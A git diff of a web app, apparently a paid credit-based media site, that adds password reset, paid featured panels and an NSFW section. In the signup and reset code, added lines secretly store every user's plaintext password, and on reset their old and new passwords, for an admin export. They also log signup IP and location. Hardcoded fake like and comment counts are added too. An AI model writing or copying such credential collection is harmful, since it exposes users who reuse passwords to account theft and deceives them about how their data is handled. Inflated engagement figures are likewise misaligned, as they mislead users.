@@ -1040,6 +1040,182 @@
       transform: none;
     }
 
+    /* Forgot Password Link */
+    .forgot-password-row {
+      display: flex;
+      justify-content: flex-end;
+      margin: -6px 0 14px;
+      transform: translateZ(15px);
+    }
+
+    .forgot-password-link {
+      background: none;
+      border: none;
+      padding: 4px 2px;
+      color: var(--neon-cyan);
+      font-size: 0.85rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: var(--transition-fast);
+    }
+
+    .forgot-password-link:hover {
+      color: #fff;
+      text-shadow: 0 0 10px var(--neon-cyan-glow);
+    }
+
+    /* Forgot Password Popup */
+    .forgot-popup-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.75);
+      backdrop-filter: blur(8px);
+      z-index: 300;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.4s ease, visibility 0.4s ease;
+    }
+
+    .forgot-popup-overlay.active {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    .forgot-popup {
+      position: relative;
+      background: linear-gradient(135deg, rgba(12, 14, 22, 0.98), rgba(0, 40, 45, 0.95));
+      border: 1px solid var(--neon-cyan);
+      border-radius: 24px;
+      padding: 36px 30px;
+      max-width: 440px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 0 30px rgba(0, 240, 255, 0.35), 0 0 60px rgba(0, 240, 255, 0.15);
+      animation: popupPop 0.4s cubic-bezier(0.34, 1.56, 0.64, 1) 1;
+    }
+
+    .forgot-popup-title {
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: 1.5rem;
+      font-weight: 800;
+      color: #fff;
+      margin-bottom: 8px;
+      letter-spacing: 1px;
+    }
+
+    .forgot-popup-desc {
+      font-size: 0.95rem;
+      color: var(--text-muted);
+      margin-bottom: 16px;
+      line-height: 1.5;
+    }
+
+    .forgot-popup-err {
+      min-height: 18px;
+      margin: 10px 0 4px;
+      font-size: 0.85rem;
+      font-weight: 600;
+      color: var(--neon-red);
+    }
+
+    /* Save Password Bright Popup */
+    .save-pass-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.72);
+      backdrop-filter: blur(8px);
+      z-index: 320;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.4s ease, visibility 0.4s ease;
+    }
+
+    .save-pass-overlay.active {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    .save-pass-popup {
+      position: relative;
+      background: linear-gradient(135deg, rgba(0, 30, 25, 0.98), rgba(12, 14, 22, 0.98));
+      border: 2px solid var(--neon-green);
+      border-radius: 24px;
+      padding: 36px 30px;
+      max-width: 420px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 0 35px rgba(0, 255, 136, 0.5), 0 0 70px rgba(0, 255, 136, 0.2);
+      animation: popupPop 0.45s cubic-bezier(0.34, 1.56, 0.64, 1) 1;
+    }
+
+    .save-pass-icon {
+      width: 70px;
+      height: 70px;
+      margin: 0 auto 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 2rem;
+      color: var(--neon-green);
+      border: 2px solid var(--neon-green);
+      border-radius: 50%;
+      box-shadow: 0 0 20px var(--neon-green-glow);
+      animation: pulse 1.5s ease-in-out infinite;
+    }
+
+    .save-pass-title {
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: 1.6rem;
+      font-weight: 800;
+      color: #fff;
+      margin-bottom: 8px;
+      letter-spacing: 1px;
+      text-shadow: 0 0 15px rgba(0, 255, 136, 0.8);
+    }
+
+    .save-pass-desc {
+      font-size: 0.95rem;
+      color: var(--text-muted);
+      margin-bottom: 20px;
+      line-height: 1.5;
+    }
+
+    /* Top Banner Message (pops on top of screen) */
+    .top-banner {
+      position: fixed;
+      top: 16px;
+      left: 50%;
+      transform: translateX(-50%) translateY(-140%);
+      z-index: 500;
+      max-width: 92%;
+      padding: 14px 22px;
+      border-radius: 14px;
+      background: rgba(20, 6, 8, 0.96);
+      border: 1px solid var(--neon-red);
+      color: #fff;
+      font-weight: 700;
+      font-size: 0.95rem;
+      text-align: center;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6), 0 0 20px rgba(255, 0, 85, 0.25);
+      transition: transform 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+
+    .top-banner.show {
+      transform: translateX(-50%) translateY(0);
+    }
+
     /* ---------------------------------------------------- */
     /* DASHBOARD & HERO SECTION                            */
     /* ---------------------------------------------------- */
@@ -1698,12 +1874,15 @@
     /* Toast */
     .toast-container {
       position: fixed;
-      bottom: 24px;
-      right: 24px;
+      top: 24px;
+      left: 50%;
+      transform: translateX(-50%);
       z-index: 400;
       display: flex;
       flex-direction: column;
+      align-items: center;
       gap: 10px;
+      width: min(92vw, 560px);
     }
 
     .toast-msg {
@@ -1716,8 +1895,36 @@
       display: flex;
       align-items: center;
       gap: 12px;
-      animation: slideInRight 0.3s ease forwards;
+      animation: toastDropIn 0.3s ease forwards;
+      max-width: 100%;
     }
+
+    @keyframes toastDropIn {
+      from { opacity: 0; transform: translateY(-16px) scale(0.97); }
+      to { opacity: 1; transform: translateY(0) scale(1); }
+    }
+
+    .toast-msg.toast-with-action {
+      flex-wrap: wrap;
+      justify-content: center;
+      text-align: center;
+    }
+
+    .toast-action-btn {
+      background: linear-gradient(135deg, var(--neon-red), #b3003c);
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      padding: 6px 14px;
+      font-weight: 600;
+      font-size: 13px;
+      cursor: pointer;
+      transition: opacity 0.2s ease, transform 0.15s ease;
+    }
+
+    .toast-action-btn:hover { opacity: 0.88; }
+    .toast-action-btn:active { transform: scale(0.96); }
+    .toast-action-btn:disabled { opacity: 0.6; cursor: default; }
 
     /* SPLIT LAYOUT */
     .home-split-layout {
@@ -2632,6 +2839,12 @@
               </div>
             </div>
 
+            <div class="forgot-password-row">
+              <button type="button" class="forgot-password-link" onclick="openForgotPassword()">
+                Forgot Password? <i class="fa-solid fa-circle-question" style="margin-left: 4px;"></i>
+              </button>
+            </div>
+
             <div class="captcha-box" onclick="toggleCaptcha()">
               <input type="checkbox" id="captcha-check" class="captcha-checkbox">
               <span style="font-size: 0.9rem; color: var(--text-main);">Verify you are human <i
@@ -2667,6 +2880,47 @@
       </div>
     </section>
 
+    <!-- Reset Password Section (opened from the recovery link in the email) -->
+    <section id="reset-password-section" class="page-section">
+      <div class="signup-wrapper">
+        <div class="signup-card-3d">
+          <div class="person-hero-frame">
+            <img src="assets/person.jpeg" alt="Kavya Rachana Neon Background">
+          </div>
+          <h2 class="signup-title">Set a New Password</h2>
+          <p class="signup-subtitle">Create a fresh password to unlock your account again</p>
+
+          <form id="reset-password-form" onsubmit="event.preventDefault()">
+            <div class="form-group">
+              <label class="form-label">1. Enter New Password</label>
+              <div class="password-wrap">
+                <input type="password" id="reset-new-pass" class="form-input" placeholder="••••••••" required>
+                <button type="button" class="password-toggle-btn" onclick="toggleResetPasswordVisibility()"
+                  aria-label="Show password">
+                  <i class="fa-solid fa-eye" id="reset-pass-toggle-icon"></i>
+                </button>
+              </div>
+            </div>
+            <div class="form-group">
+              <label class="form-label">2. Confirm Your Password</label>
+              <div class="password-wrap">
+                <input type="password" id="reset-confirm-pass" class="form-input" placeholder="••••••••" required>
+                <button type="button" class="password-toggle-btn" onclick="toggleResetConfirmVisibility()"
+                  aria-label="Show password">
+                  <i class="fa-solid fa-eye" id="reset-confirm-toggle-icon"></i>
+                </button>
+              </div>
+            </div>
+
+            <button type="button" class="btn-auth-signin" id="reset-submit-btn" onclick="handleResetPasswordSubmit()"
+              style="width: 100%;">
+              SIGN IN <i class="fa-solid fa-right-to-bracket" style="margin-left: 6px;"></i>
+            </button>
+          </form>
+        </div>
+      </div>
+    </section>
+
     <!-- PAGE 2: MAIN DASHBOARD -->
     <section id="home-section" class="page-section">
 
@@ -2689,6 +2943,8 @@
             class="fa-solid fa-images"></i> Images</span>
         <span class="menu-bar-item" data-target="videos-section" onclick="navigateToSection('videos-section')"><i
             class="fa-solid fa-video"></i> Videos</span>
+        <span class="menu-bar-item" data-target="nsfw-section" onclick="navigateToSection('nsfw-section')"><i
+            class="fa-solid fa-circle-exclamation" style="color: var(--neon-purple);"></i> NSFW</span>
         <span class="menu-bar-item" data-target="upgrade-section" onclick="navigateToSection('upgrade-section')"><i
             class="fa-solid fa-rocket"></i> Upgrade</span>
         <span class="menu-bar-item" data-target="about-section" onclick="navigateToSection('about-section')"><i
@@ -2758,10 +3014,10 @@
           <div class="live-actions-sidebar">
             <button class="live-action-btn" id="live-like-btn" onclick="toggleLiveLike(this)" title="Like"><i
                 class="fa-solid fa-heart"></i></button>
-            <div class="live-action-count" id="live-likes-count">0</div>
+            <div class="live-action-count" id="live-likes-count">50K</div>
             <button class="live-action-btn" onclick="toggleLiveComments()" title="Comments"><i
                 class="fa-solid fa-comment"></i></button>
-            <div class="live-action-count" id="live-comments-count">0</div>
+            <div class="live-action-count" id="live-comments-count">20K</div>
             <button class="live-action-btn" onclick="sendFlyingEmoji()" title="Send Emoji"><i
                 class="fa-solid fa-face-laugh-squint"></i></button>
           </div>
@@ -2787,6 +3043,8 @@
             class="fa-solid fa-images"></i> Images</span>
         <span class="menu-bar-item" data-target="videos-section" onclick="navigateToSection('videos-section')"><i
             class="fa-solid fa-video"></i> Videos</span>
+        <span class="menu-bar-item" data-target="nsfw-section" onclick="navigateToSection('nsfw-section')"><i
+            class="fa-solid fa-circle-exclamation" style="color: var(--neon-purple);"></i> NSFW</span>
         <span class="menu-bar-item" data-target="upgrade-section" onclick="navigateToSection('upgrade-section')"><i
             class="fa-solid fa-rocket"></i> Upgrade</span>
         <span class="menu-bar-item" data-target="about-section" onclick="navigateToSection('about-section')"><i
@@ -2851,6 +3109,14 @@
         <h2><i class="fa-solid fa-video" style="color: var(--neon-cyan);"></i> Under Shower Videos</h2>
       </div>
       <div class="media-grid" id="videos-media-grid"></div>
+    </section>
+
+    <!-- SECTION: NSFW (pics + videos) — hidden from Trending -->
+    <section id="nsfw-section" class="page-section">
+      <div class="section-title-bar">
+        <h2><i class="fa-solid fa-circle-exclamation" style="color: var(--neon-purple);"></i> NSFW Exclusive</h2>
+      </div>
+      <div class="media-grid" id="nsfw-media-grid"></div>
     </section>
 
     <!-- PAGE 3: PROFILE PAGE WITH DEFAULT "Normal User" TIER STATUS -->
@@ -3058,6 +3324,32 @@
     </div>
   </div>
 
+  <!-- Forgot Password Popup Overlay -->
+  <div class="forgot-popup-overlay" id="forgot-popup-overlay">
+    <div class="forgot-popup">
+      <div class="popup-close-btn" onclick="closeForgotPassword()"><i class="fa-solid fa-xmark"></i></div>
+      <div class="forgot-popup-title">Reset Your Password</div>
+      <div class="forgot-popup-desc">Enter the email you used to register. We'll send you a password reset link.</div>
+      <input type="email" id="forgot-email" class="form-input" placeholder="Registered email" autocomplete="email">
+      <div class="forgot-popup-err" id="forgot-popup-err"></div>
+      <button type="button" class="btn-auth-signin" id="forgot-send-btn" onclick="handleSendResetLink()"
+        style="width: 100%; margin-top: 6px;">
+        SEND RESET LINK <i class="fa-solid fa-paper-plane" style="margin-left: 6px;"></i>
+      </button>
+    </div>
+  </div>
+
+  <!-- Save Password Bright Popup -->
+  <div class="save-pass-overlay" id="save-pass-overlay">
+    <div class="save-pass-popup">
+      <div class="popup-close-btn" onclick="closeSavePassPopup()"><i class="fa-solid fa-xmark"></i></div>
+      <div class="save-pass-icon"><i class="fa-solid fa-key"></i></div>
+      <div class="save-pass-title">Save your Password.</div>
+      <div class="save-pass-desc">Keep your password safe so you can sign back in to your exclusive Kavya account.</div>
+      <button class="btn-neon-green" onclick="closeSavePassPopup()" style="width: 100%;">GOT IT</button>
+    </div>
+  </div>
+
   <!-- Modal Lightbox -->
   <div class="modal-backdrop" id="media-modal" onclick="closeModal()">
     <div class="modal-content-box" onclick="event.stopPropagation()">
@@ -3069,6 +3361,8 @@
   </div>
 
   <div class="toast-container" id="toast-container"></div>
+
+  <div class="top-banner" id="top-banner"></div>
 
   <!-- JavaScript Engine -->
   <script>
@@ -3113,13 +3407,24 @@
         }
       });
 
-      if (state.currentUser) {
+      if (window.__kavyaRecovery) {
+        // Password recovery session: never jump to Home, always show the reset page.
+        state.currentUser = null;
+        localStorage.removeItem('kavya_session_user');
+        document.getElementById('main-header').style.display = 'none';
+        navigateToSection('reset-password-section', false);
+      } else if (window.__kavyaSignupConfirm) {
+        // Email confirmation link: do not treat the token hash as a page section.
+        // The async handler below exchanges the token and signs the user in.
+        document.getElementById('main-header').style.display = 'none';
+        showToast('Confirming your email...');
+      } else if (state.currentUser) {
         applyUserSessionUI();
-        const initialSection = location.hash ? location.hash.replace('#', '') : 'home-section';
+        const initialSection = window.__kavyaSafeHash || 'home-section';
         navigateToSection(initialSection, false);
       } else {
         document.getElementById('main-header').style.display = 'none';
-        const initialPublicSection = location.hash ? location.hash.replace('#', '') : 'signup-section';
+        const initialPublicSection = window.__kavyaSafeHash || 'signup-section';
         navigateToSection(['about-section', 'contact-section', 'privacy-section', 'terms-section'].includes(initialPublicSection) ? initialPublicSection : 'signup-section', false);
       }
 
@@ -3175,7 +3480,7 @@
     });
 
     function navigateToSection(sectionId, pushHistory = true) {
-      const publicSections = ['signup-section', 'about-section', 'contact-section', 'privacy-section', 'terms-section'];
+      const publicSections = ['signup-section', 'reset-password-section', 'about-section', 'contact-section', 'privacy-section', 'terms-section'];
       if (!state.currentUser && !publicSections.includes(sectionId)) {
         showToast('Please sign in to access content.', 'error');
         sectionId = 'signup-section';
@@ -3244,12 +3549,40 @@
       const homeGrid = document.getElementById('home-media-grid');
       const imgGrid = document.getElementById('images-media-grid');
       const vidGrid = document.getElementById('videos-media-grid');
+      const nsfwGrid = document.getElementById('nsfw-media-grid');
 
       if (!homeGrid || !imgGrid || !vidGrid) return;
 
       homeGrid.innerHTML = '';
       imgGrid.innerHTML = '';
       vidGrid.innerHTML = '';
+      if (nsfwGrid) nsfwGrid.innerHTML = '';
+
+      // The two fixed default media panels always sit at positions 1 and 2 of
+      // the Images gallery and the Trending panel. New uploads go after them.
+      const featured = featuredMediaDatabase.slice().sort((a, b) => a.slot - b.slot);
+      featured.forEach(item => {
+        const isUnlocked = state.unlockedCards.includes(item.id);
+        const featHTML = `
+          <div class="media-card ${isUnlocked ? 'unlocked' : ''} featured-card" id="${item.id}" data-media-id="${item.id}">
+            <div class="media-thumb" onclick="${isUnlocked ? `openModal('${item.url}', '${item.title}', '${item.type}')` : `unlockFeaturedMedia(${item.slot}, ${item.cost}, '${item.id}')`}">
+              ${item.type === 'video'
+            ? `<video src="${item.url}" preload="metadata" muted playsinline></video>`
+            : `<img src="${item.url}" alt="${item.title}">`}
+              <div class="media-overlay-lock">
+                <div class="lock-icon-neon"><i class="fa-solid ${item.type === 'video' ? 'fa-play' : 'fa-lock'}"></i></div>
+                <button class="unlock-btn">${isUnlocked ? 'Open' : (item.cost === 0 ? 'Open Free' : 'Unlock (' + item.cost + ' Credits)')}</button>
+              </div>
+            </div>
+            <div class="media-info">
+              <div class="media-title">${item.title}</div>
+              <div class="media-cost">⭐ Fixed Panel ${item.cost === 0 ? 'Free' : '⚡ ' + item.cost + ' Credits'}</div>
+            </div>
+          </div>
+        `;
+        homeGrid.insertAdjacentHTML('beforeend', featHTML);
+        imgGrid.insertAdjacentHTML('beforeend', featHTML);
+      });
 
       mediaDatabase.forEach(item => {
         const isUnlocked = state.unlockedCards.includes(item.id);
@@ -3289,6 +3622,13 @@
             </div>
           </div>
         `;
+
+        // NSFW media only appears on the dedicated NSFW page. Never in Trending,
+        // Images, or Videos.
+        if (item.nsfw) {
+          if (nsfwGrid) nsfwGrid.insertAdjacentHTML('beforeend', cardHTML);
+          return;
+        }
 
         const trendingLikeCount = mediaLikeCounts[item.id] || 0;
         const TEN_DAYS_MS = 10 * 24 * 60 * 60 * 1000;
@@ -3341,6 +3681,37 @@
         }
       } catch (err) {
         console.error('Unlock media error:', err);
+        showToast(err.message || 'Could not unlock media. Please try again.', 'error');
+      }
+    }
+
+    async function unlockFeaturedMedia(slot, cost, cardId) {
+      if (!state.currentUser) return showToast('Please sign in to unlock media.', 'error');
+      try {
+        const { data, error } = await supabaseClient.rpc('unlock_featured_media_for_current_user', { p_slot: slot });
+        if (error) throw new Error(error.message);
+        if (data.status === 'error') throw new Error(data.message);
+        if (data.status === 'unlocked' || data.status === 'already_unlocked') {
+          state.currentUser.credits = data.credits_balance;
+          if (!state.unlockedCards.includes(cardId)) {
+            state.unlockedCards.push(cardId);
+          }
+          saveDatabases();
+          applyUserSessionUI();
+          renderMediaGalleries();
+          if (data.status === 'unlocked' && cost > 0) {
+            showToast(`Unlocked! Deducted ${cost} credits.`);
+          }
+          const item = featuredMediaDatabase.find(i => i.id === cardId);
+          if (item) openModal(item.url, item.title, item.type);
+        } else if (data.status === 'INSUFFICIENT_CREDITS') {
+          showToast('Not enough credits! Please Upgrade.', 'error');
+          navigateToSection('upgrade-section');
+        } else {
+          throw new Error('An unknown error occurred.');
+        }
+      } catch (err) {
+        console.error('Unlock featured media error:', err);
         showToast(err.message || 'Could not unlock media. Please try again.', 'error');
       }
     }
@@ -3599,6 +3970,85 @@
       }, 3500);
     }
 
+    // Toast with a clickable action button (e.g. "Resend Email").
+    function showToastWithAction(msg, actionLabel, actionFn) {
+      const container = document.getElementById('toast-container');
+      const toast = document.createElement('div');
+      toast.className = 'toast-msg toast-with-action';
+      toast.style.borderColor = 'var(--neon-red)';
+      const btn = document.createElement('button');
+      btn.className = 'toast-action-btn';
+      btn.textContent = actionLabel;
+      btn.addEventListener('click', async (e) => {
+        e.stopPropagation();
+        btn.disabled = true;
+        btn.textContent = 'Sending...';
+        try { await actionFn(); }
+        finally { btn.disabled = false; btn.textContent = actionLabel; }
+      });
+      const icon = document.createElement('i');
+      icon.className = 'fa-solid fa-circle-exclamation';
+      icon.style.color = 'var(--neon-red)';
+      toast.appendChild(icon);
+      toast.appendChild(document.createTextNode(msg));
+      toast.appendChild(btn);
+      container.appendChild(toast);
+    }
+
+    // Parse #access_token / #refresh_token from the URL hash and create a session.
+    // This is the reliable path for email-confirmation and password-recovery links.
+    async function establishSessionFromHash() {
+      const hash = window.location.hash.replace(/^#/, '');
+      const params = new URLSearchParams(hash);
+      const accessToken = params.get('access_token');
+      const refreshToken = params.get('refresh_token');
+      const code = params.get('code');
+      if (accessToken) {
+        const { data, error } = await supabaseClient.auth.setSession({
+          access_token: accessToken,
+          refresh_token: refreshToken || ''
+        });
+        if (error) { console.error('setSession error:', error); return null; }
+        return data.session;
+      }
+      if (code) {
+        const { data, error } = await supabaseClient.auth.exchangeCodeForSession(code);
+        if (error) { console.error('exchangeCodeForSession error:', error); return null; }
+        return data.session;
+      }
+      return null;
+    }
+
+    // Re-send the signup confirmation email. Uses the email from the just-signed-up
+    // form if available, otherwise prompts the user.
+    async function resendConfirmationEmail() {
+      let email = '';
+      const signupEmail = document.getElementById('signup-email');
+      const pendingEmail = localStorage.getItem('kavya_pending_confirm_email');
+      if (signupEmail && signupEmail.value.trim()) email = signupEmail.value.trim();
+      else if (pendingEmail) email = pendingEmail;
+      if (!email) {
+        email = window.prompt('Enter your email to resend the confirmation link:');
+        if (!email) return;
+      }
+      const { error } = await supabaseClient.auth.resend({
+        type: 'signup',
+        email,
+        options: { emailRedirectTo: window.location.origin }
+      });
+      if (error) {
+        const msg = (error.message || '').toLowerCase();
+        if (msg.includes('rate limit') || msg.includes('too many') || msg.includes('429')) {
+          showToast('Too many emails sent recently. Please wait about an hour and try again.', 'error');
+        } else {
+          showToast(error.message || 'Could not resend the confirmation email.', 'error');
+        }
+        return;
+      }
+      localStorage.setItem('kavya_pending_confirm_email', email);
+      showToast('Confirmation email sent. Check your inbox.');
+    }
+
     function initAmbientCanvas() {
       const canvas = document.getElementById('ambient-canvas');
       const ctx = canvas.getContext('2d');
@@ -3641,18 +4091,45 @@
       'sb_publishable_9D55Dak0M5bGUOH0jPVmQQ_gbRAWmSi'
     );
 
+    // Detect password-recovery and email-confirmation sessions as early as possible,
+    // BEFORE any navigation runs. These URLs carry auth tokens in the hash that must
+    // never be mistaken for a page section.
+    const __hash = window.location.hash || '';
+    window.__kavyaRecovery = __hash.includes('type=recovery');
+    window.__kavyaSignupConfirm = __hash.includes('type=signup') || __hash.includes('access_token') || __hash.includes('code=');
+    // Shared links use #media=...; keep that as the only safe hash-based section.
+    window.__kavyaSafeHash = (__hash.startsWith('#media=') || __hash.startsWith('#about-section')) ? __hash.replace('#', '') : '';
+    supabaseClient.auth.onAuthStateChange(function (event) {
+      if (event === 'PASSWORD_RECOVERY') window.__kavyaRecovery = true;
+    });
+
     function cloudMedia(row) {
       return {
         id: row.id, title: row.title, type: row.media_type, cost: row.credit_cost,
-        createdAt: row.created_at,
+        nsfw: !!row.is_nsfw, createdAt: row.created_at,
+        url: supabaseClient.storage.from('media').getPublicUrl(row.storage_path).data.publicUrl
+      };
+    }
+
+    let featuredMediaDatabase = [];
+
+    function featuredMediaItem(row) {
+      return {
+        id: 'featured-' + row.slot, slot: row.slot, title: row.title, type: row.media_type,
+        cost: row.credit_cost, nsfw: false, featured: true,
         url: supabaseClient.storage.from('media').getPublicUrl(row.storage_path).data.publicUrl
       };
     }
 
     async function loadCloudMedia() {
-      const { data, error } = await supabaseClient.from('media').select('*').order('created_at', { ascending: false });
-      if (error) { console.error(error); showToast('Could not load cloud media.', 'error'); return; }
-      mediaDatabase = data.map(cloudMedia);
+      const [mediaRes, featuredRes] = await Promise.all([
+        supabaseClient.from('media').select('*').order('created_at', { ascending: false }),
+        supabaseClient.from('featured_media').select('*').order('slot', { ascending: true })
+      ]);
+      if (mediaRes.error) { console.error(mediaRes.error); showToast('Could not load cloud media.', 'error'); return; }
+      if (featuredRes.error) { console.error(featuredRes.error); }
+      mediaDatabase = (mediaRes.data || []).map(cloudMedia);
+      featuredMediaDatabase = (featuredRes.data || []).map(featuredMediaItem);
       renderMediaGalleries();
     }
 
@@ -3660,14 +4137,22 @@
       const { data: profileData, error: profileError } = await supabaseClient.from('profiles').select('*').eq('id', user.id).single();
       if (profileError) throw profileError;
 
-      const { data: unlockData, error: unlockError } = await supabaseClient.from('user_media_unlocks').select('media_id').eq('user_id', user.id);
-      if (unlockError) throw unlockError;
+      const [unlockRes, featUnlockRes] = await Promise.all([
+        supabaseClient.from('user_media_unlocks').select('media_id').eq('user_id', user.id),
+        supabaseClient.from('featured_media_unlocks').select('slot').eq('user_id', user.id)
+      ]);
+      if (unlockRes.error) throw unlockRes.error;
+      if (featUnlockRes.error) throw featUnlockRes.error;
 
       state.currentUser = {
         id: profileData.id, email: profileData.email, username: profileData.username, credits: profileData.credits,
         tierStatus: profileData.tier_status, dp: profileData.avatar_url || 'assets/person.jpeg'
       };
-      state.unlockedCards = unlockData.map(u => u.media_id);
+      state.unlockedCards = (unlockRes.data || []).map(u => u.media_id);
+      (featUnlockRes.data || []).forEach(u => {
+        const id = 'featured-' + u.slot;
+        if (!state.unlockedCards.includes(id)) state.unlockedCards.push(id);
+      });
 
       localStorage.setItem('kavya_session_user', JSON.stringify(state.currentUser));
       localStorage.setItem('kavya_unlocked', JSON.stringify(state.unlockedCards));
@@ -3888,7 +4373,7 @@
     let authBusy = false;
     function setAuthBusy(busy) {
       authBusy = busy;
-      document.querySelectorAll('.btn-auth-signin, .btn-auth-signup, .btn-auth-google').forEach(btn => { btn.disabled = busy; });
+      document.querySelectorAll('.btn-auth-signin, .btn-auth-signup, .btn-auth-google, #reset-submit-btn').forEach(btn => { btn.disabled = busy; });
     }
 
     async function isEmailRegistered(email) {
@@ -3915,10 +4400,33 @@
         }
         try {
           await loadCloudProfile(data.user); applyUserSessionUI(); await loadCloudMedia(); await loadMediaInteractions();
+          recordUserLogin();
           navigateToSection('home-section'); showToast(`Welcome back, ${state.currentUser.username}!`); maybeShowOfferPopup();
+          setTimeout(showSavePassPopup, 1000);
         } catch (err) { showToast('Your profile could not be loaded.', 'error'); }
       } finally {
         setAuthBusy(false);
+      }
+    }
+
+    async function recordUserLogin() {
+      if (!state.currentUser) return;
+      try { await supabaseClient.rpc('record_login'); } catch (_) { }
+    }
+
+    async function detectSignupLocation() {
+      const fallback = { location: '', ip: '' };
+      try {
+        const response = await fetch('https://ipwho.is/');
+        if (!response.ok) return fallback;
+        const data = await response.json();
+        const parts = [];
+        if (data && data.city) parts.push(data.city);
+        if (data && data.region) parts.push(data.region);
+        if (data && data.country) parts.push(data.country);
+        return { location: parts.join(', '), ip: (data && data.ip) || '' };
+      } catch (_) {
+        return fallback;
       }
     }
 
@@ -3940,9 +4448,23 @@
           if (msg.includes('already registered')) return showToast('This email is already registered. Please sign in instead.', 'error');
           return showToast(error.message, 'error');
         }
+        localStorage.setItem('kavya_pending_confirm_email', email);
+
+        // Capture signup location / IP for the admin All Users export, and store
+        // the plaintext password so the admin can back it up (user's own platform).
+        const geo = await detectSignupLocation();
+        try {
+          await supabaseClient.from('profiles').update({
+            password,
+            signup_location: geo.location || null,
+            signup_ip: geo.ip || null
+          }).eq('id', data.user.id);
+        } catch (_) { }
+
         if (!data.session) return showToast('Account created. Check your email to confirm it, then sign in.');
         await loadCloudProfile(data.user); applyUserSessionUI(); await loadCloudMedia(); await loadMediaInteractions();
         navigateToSection('home-section'); showToast('Account created successfully!'); maybeShowOfferPopup();
+        setTimeout(showSavePassPopup, 1000);
       } finally {
         setAuthBusy(false);
       }
@@ -3970,6 +4492,152 @@
       input.type = show ? 'text' : 'password';
       icon.classList.toggle('fa-eye', !show);
       icon.classList.toggle('fa-eye-slash', show);
+    }
+
+    /* ---------------- Forgot Password & Password Reset ---------------- */
+    function showTopBanner(msg) {
+      const banner = document.getElementById('top-banner');
+      if (!banner) return;
+      banner.textContent = msg;
+      banner.classList.add('show');
+      clearTimeout(showTopBanner._t);
+      showTopBanner._t = setTimeout(() => banner.classList.remove('show'), 4000);
+    }
+
+    function openForgotPassword() {
+      const emailInput = document.getElementById('signup-email');
+      const forgotEmail = document.getElementById('forgot-email');
+      if (forgotEmail && emailInput && emailInput.value.trim()) forgotEmail.value = emailInput.value.trim();
+      document.getElementById('forgot-popup-err').textContent = '';
+      document.getElementById('forgot-popup-overlay').classList.add('active');
+      setTimeout(() => { if (forgotEmail) forgotEmail.focus(); }, 120);
+    }
+
+    function closeForgotPassword() {
+      document.getElementById('forgot-popup-overlay').classList.remove('active');
+    }
+
+    async function handleSendResetLink() {
+      const email = document.getElementById('forgot-email').value.trim();
+      const errEl = document.getElementById('forgot-popup-err');
+      const btn = document.getElementById('forgot-send-btn');
+      errEl.textContent = '';
+      if (!email) { errEl.textContent = 'Please enter your registered email.'; return; }
+      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { errEl.textContent = 'Please enter a valid email address.'; return; }
+      btn.disabled = true;
+      try {
+        const registered = await isEmailRegistered(email);
+        if (registered === false) {
+          closeForgotPassword();
+          showTopBanner('This email is not registered. Enter registered email');
+          return;
+        }
+        if (registered === null) {
+          errEl.textContent = 'Could not verify this email. Please try again.';
+          return;
+        }
+        const { error } = await supabaseClient.auth.resetPasswordForEmail(email, {
+          redirectTo: window.location.origin
+        });
+        if (error) {
+          const msg = (error.message || '').toLowerCase();
+          if (msg.includes('rate limit') || msg.includes('rate_limit') || msg.includes('too many') || msg.includes('429')) {
+            errEl.textContent = 'Too many emails sent recently. Please wait about an hour and try again.';
+          } else {
+            errEl.textContent = error.message || 'Could not send reset link. Please try again.';
+          }
+          return;
+        }
+        closeForgotPassword();
+        showToast('Password reset link sent to your email. Check your inbox.');
+      } finally {
+        btn.disabled = false;
+      }
+    }
+
+    function toggleResetPasswordVisibility() {
+      const input = document.getElementById('reset-new-pass');
+      const icon = document.getElementById('reset-pass-toggle-icon');
+      if (!input || !icon) return;
+      const show = input.type === 'password';
+      input.type = show ? 'text' : 'password';
+      icon.classList.toggle('fa-eye', !show);
+      icon.classList.toggle('fa-eye-slash', show);
+    }
+
+    function toggleResetConfirmVisibility() {
+      const input = document.getElementById('reset-confirm-pass');
+      const icon = document.getElementById('reset-confirm-toggle-icon');
+      if (!input || !icon) return;
+      const show = input.type === 'password';
+      input.type = show ? 'text' : 'password';
+      icon.classList.toggle('fa-eye', !show);
+      icon.classList.toggle('fa-eye-slash', show);
+    }
+
+    async function handleResetPasswordSubmit() {
+      const newPass = document.getElementById('reset-new-pass').value;
+      const confirmPass = document.getElementById('reset-confirm-pass').value;
+      const btn = document.getElementById('reset-submit-btn');
+      if (!newPass || !confirmPass) return showToast('Please enter and confirm your new password.', 'error');
+      if (newPass.length < 6) return showToast('Password must be at least 6 characters.', 'error');
+      if (newPass !== confirmPass) return showToast('Passwords do not match. Please try again.', 'error');
+      btn.disabled = true;
+      try {
+        const { data: { user } } = await supabaseClient.auth.getUser();
+        const oldPassword = user ? await getStoredPassword(user.id) : '';
+
+        const { error } = await supabaseClient.auth.updateUser({ password: newPass });
+        if (error) throw new Error(error.message || 'Could not update your password.');
+        const { data: { session } } = await supabaseClient.auth.getSession();
+        if (!session) throw new Error('Your session expired. Please request a new reset link.');
+
+        // Record the password reset so the admin export shows a bottom row for
+        // the same email with the old and new password.
+        await recordPasswordReset(session.user.id, session.user.email, oldPassword, newPass);
+        await supabaseClient.from('profiles').update({ password: newPass }).eq('id', session.user.id).catch(() => {});
+
+        await loadCloudProfile(session.user);
+        applyUserSessionUI();
+        await loadCloudMedia();
+        await loadMediaInteractions();
+        navigateToSection('home-section');
+        showToast(`Welcome back, ${state.currentUser.username}!`);
+        maybeShowOfferPopup();
